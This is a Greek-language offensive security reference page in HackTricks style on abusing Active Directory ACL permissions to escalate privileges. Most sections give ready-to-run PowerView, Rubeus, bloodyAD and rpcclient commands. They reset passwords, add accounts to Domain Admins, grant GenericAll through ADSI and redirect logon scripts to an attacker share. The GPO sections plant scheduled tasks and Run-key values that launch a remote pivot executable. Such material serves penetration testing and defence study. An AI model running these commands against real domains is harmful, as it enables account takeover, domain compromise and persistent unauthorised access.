# Κατάχρηση των Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια περίληψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, δείτε τα αρχικά άρθρα.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll δικαιώματα σε χρήστη**

Αυτό το προνόμιο δίνει σε έναν επιτιθέμενο πλήρη έλεγχο πάνω σε έναν στοχευμένο λογαριασμό χρήστη. Μόλις τα δικαιώματα `GenericAll` επιβεβαιωθούν χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ένας επιτιθέμενος μπορεί να:

- **Αλλαγή του κωδικού του στόχου**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό του χρήστη.
- **Targeted Kerberoasting**: Ανάθεσε ένα SPN στον λογαριασμό του χρήστη για να τον καταστήσεις kerberoastable, στη συνέχεια χρησιμοποίησε Rubeus και targetedKerberoast.py για να εξαγάγεις και να επιχειρήσεις να σπάσεις τα hashes του ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Απενεργοποιήστε το pre-authentication για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Δικαιώματα σε Ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να χειρίζεται τις συμμετοχές σε ομάδα εάν έχει δικαιώματα `GenericAll` σε μια ομάδα όπως την `Domain Admins`. Αφού εντοπίσει το distinguished name της ομάδας με το `Get-NetGroup`, ο επιτιθέμενος μπορεί:

- **Προσθήκη του εαυτού τους στην ομάδα `Domain Admins`**: Αυτό μπορεί να γίνει μέσω άμεσων εντολών ή χρησιμοποιώντας modules όπως Active Directory ή PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Από Linux μπορείτε επίσης να εκμεταλλευτείτε το BloodyAD για να προσθέσετε τον εαυτό σας σε αυθαίρετες ομάδες όταν έχετε δικαιώματα GenericAll/Write επ’ αυτών. Εάν η στοχευόμενη ομάδα είναι εμφωλευμένη στο “Remote Management Users”, θα αποκτήσετε αμέσως πρόσβαση WinRM σε hosts που αναγνωρίζουν αυτή την ομάδα:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Η κατοχή αυτών των δικαιωμάτων σε ένα αντικείμενο υπολογιστή ή σε λογαριασμό χρήστη επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την κατάληψη ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρησιμοποιήστε αυτήν την τεχνική για να προσποιηθείτε έναν υπολογιστή ή λογαριασμό χρήστη, εκμεταλλευόμενοι τα δικαιώματα για να δημιουργήσετε shadow credentials.

## **WriteProperty on Group**

Αν ένας χρήστης διαθέτει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα μιας συγκεκριμένης ομάδας (π.χ., `Domain Admins`), μπορεί να:

- **Add Themselves to the Domain Admins Group**: Εφικτό μέσω συνδυασμού των εντολών `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει την κλιμάκωση προνομίων εντός του domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Αυτό το προνόμιο επιτρέπει σε επιτιθέμενους να προσθέσουν τον εαυτό τους σε συγκεκριμένες ομάδες, όπως `Domain Admins`, μέσω εντολών που χειρίζονται άμεσα τα μέλη της ομάδας. Η χρήση της ακόλουθης ακολουθίας εντολών επιτρέπει την αυτο-προσθήκη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ένα παρόμοιο προνόμιο, αυτό επιτρέπει σε επιτιθέμενους να προσθέτουν απευθείας τον εαυτό τους σε ομάδες τροποποιώντας τις ιδιότητες της ομάδας, εφόσον έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και η εκτέλεση αυτού του προνόμιου γίνονται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά κωδικών χωρίς να γνωρίζετε τον τρέχοντα κωδικό. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας διάφορες μεθόδους για την επαναφορά του κωδικού ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και one-liners για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, δείχνοντας την ευελιξία των attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Εάν ένας επιτιθέμενος διαπιστώσει ότι έχει δικαιώματα `WriteOwner` πάνω σε μια ομάδα, μπορεί να αλλάξει την ιδιοκτησία της ομάδας στον εαυτό του. Αυτό είναι ιδιαίτερα επιδραστικό όταν η ομάδα στην οποία αναφερόμαστε είναι οι `Domain Admins`, καθώς η αλλαγή ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο πάνω σε χαρακτηριστικά της ομάδας και στη σύνθεσή της. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού αντικειμένου μέσω `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για να τροποποιηθεί ο ιδιοκτήτης, είτε με SID είτε με όνομα.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Αυτή η άδεια επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει ιδιότητες χρήστη. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο επιτιθέμενος μπορεί να αλλάξει τη διαδρομή του logon script ενός χρήστη ώστε να εκτελεστεί ένα κακόβουλο script κατά το logon του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για να ενημερωθεί η ιδιότητα `scriptpath` του στοχευμένου χρήστη ώστε να δείχνει στο script του επιτιθέμενου.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group

Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να χειρίζονται τη συμμετοχή σε ομάδες, όπως να προσθέτουν τον εαυτό τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός credential object, τη χρήση του για να προσθέσουν ή να αφαιρέσουν χρήστες από μια ομάδα, και την επαλήθευση των αλλαγών συμμετοχής με εντολές PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Το να κατέχεις ένα αντικείμενο AD και να έχεις δικαιώματα `WriteDACL` πάνω του επιτρέπει σε έναν επιτιθέμενο να παραχωρήσει στον εαυτό του δικαιώματα `GenericAll` πάνω στο αντικείμενο. Αυτό επιτυγχάνεται μέσω χειρισμού του ADSI, παρέχοντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα να τροποποιήσει τις συμμετοχές του σε ομάδες. Παρόλα αυτά, υπάρχουν περιορισμοί όταν κάποιος προσπαθεί να εκμεταλλευτεί αυτά τα δικαιώματα χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Αναπαραγωγή στον τομέα (DCSync)**

Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένα δικαιώματα αναπαραγωγής στον τομέα για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως `DS-Replication-Get-Changes`, επιτρέποντας σε επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το AD περιβάλλον χωρίς άμεση πρόσβαση σε Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η εξουσιοδότηση για τη διαχείριση των Group Policy Objects (GPOs) μπορεί να παρουσιάσει σημαντικούς κινδύνους ασφάλειας. Για παράδειγμα, αν σε έναν χρήστη όπως ο `offense\spotless` ανατεθούν δικαιώματα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl**, και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να χρησιμοποιηθούν κακόβουλα, όπως εντοπίζεται με το PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Ανίχνευση Δικαιωμάτων GPO

Για να εντοπιστούν λανθασμένα ρυθμισμένα GPOs, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την ανακάλυψη GPOs που ένας συγκεκριμένος χρήστης έχει δικαιώματα να διαχειρίζεται: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Είναι δυνατό να επιλυθεί σε ποιους υπολογιστές εφαρμόζεται ένα συγκεκριμένο GPO, βοηθώντας στην κατανόηση του εύρους της πιθανής επίπτωσης. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Η αναγνώριση των organizational units (OUs) που επηρεάζονται από μια δεδομένη πολιτική μπορεί να γίνει χρησιμοποιώντας `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**GPOHound**](https://github.com/cogiceo/GPOHound) για να καταγράψετε τα GPOs και να βρείτε ζητήματα σε αυτά.

### Εκμετάλλευση GPO - New-GPOImmediateTask

Τα λανθασμένα ρυθμισμένα GPOs μπορούν να εκμεταλλευτούν για την εκτέλεση κώδικα, για παράδειγμα με τη δημιουργία μιας άμεσης χρονοπρογραμματισμένης εργασίας. Αυτό μπορεί να γίνει για να προστεθεί ένας χρήστης στην τοπική ομάδα διαχειριστών σε επηρεαζόμενους υπολογιστές, αυξάνοντας σημαντικά τα προνόμια:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το GroupPolicy module, εάν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPOs, καθώς και τη ρύθμιση προτιμήσεων όπως registry values για την εκτέλεση backdoors στους επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί το GPO να ενημερωθεί και έναν χρήστη να συνδεθεί στον υπολογιστή για να εκτελεστεί:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

Το SharpGPOAbuse προσφέρει μια μέθοδο για την κατάχρηση υπαρχόντων GPOs, προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί την τροποποίηση υπαρχόντων GPOs ή τη χρήση εργαλείων RSAT για τη δημιουργία νέων πριν την εφαρμογή των αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Εξαναγκασμένη Ενημέρωση Πολιτικής

Οι ενημερώσεις των GPO συνήθως πραγματοποιούνται περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, μπορεί να χρησιμοποιηθεί στον στοχευόμενο υπολογιστή η εντολή `gpupdate /force` για να εξαναγκάσει άμεση ενημέρωση πολιτικής. Αυτή η εντολή διασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO εφαρμόζονται χωρίς να περιμένουν τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Πώς λειτουργεί

Κατά την επιθεώρηση των Προγραμματισμένων Εργασιών (Scheduled Tasks) για ένα συγκεκριμένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως το `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω scripts ή εργαλείων γραμμής εντολών με στόχο τη μεταβολή της συμπεριφοράς του συστήματος ή την κλιμάκωση προνομίων.

Η δομή της εργασίας, όπως φαίνεται στο αρχείο διαμόρφωσης XML που παράγεται από το `New-GPOImmediateTask`, περιγράφει τις λεπτομέρειες της προγραμματισμένης εργασίας — συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των triggers της. Αυτό το αρχείο αντιπροσωπεύει τον τρόπο με τον οποίο ορίζονται και διαχειρίζονται οι προγραμματισμένες εργασίες εντός των GPO, παρέχοντας έναν τρόπο εκτέλεσης αυθαίρετων εντολών ή scripts στο πλαίσιο της επιβολής πολιτικής.

### Χρήστες και Ομάδες

Τα GPO επιτρέπουν επίσης τη χειραγώγηση των μελών χρηστών και ομάδων στα στοχευμένα συστήματα. Επεξεργαζόμενοι απευθείας τα policy αρχεία Users and Groups, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως η τοπική ομάδα `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, που επιτρέπει την τροποποίηση των αρχείων πολιτικής για την προσθήκη νέων χρηστών ή την αλλαγή των μελών ομάδων.

Το αρχείο διαμόρφωσης XML για τα Users and Groups περιγράφει τον τρόπο εφαρμογής αυτών των αλλαγών. Προσθέτοντας εγγραφές σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να λάβουν αυξημένα προνόμια σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση για κλιμάκωση προνομίων μέσω της χειραγώγησης των GPO.

Επιπλέον, μπορούν να ληφθούν υπόψη και άλλες μέθοδοι για εκτέλεση κώδικα ή διατήρηση επίμονης πρόσβασης, όπως η αξιοποίηση logon/logoff scripts, η τροποποίηση registry keys για autoruns, η εγκατάσταση λογισμικού μέσω .msi αρχείων ή η επεξεργασία των ρυθμίσεων services. Αυτές οι τεχνικές παρέχουν διάφορες οδούς για τη διατήρηση πρόσβασης και τον έλεγχο των στοχευμένων συστημάτων μέσω της κακής χρήσης των GPO.

## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
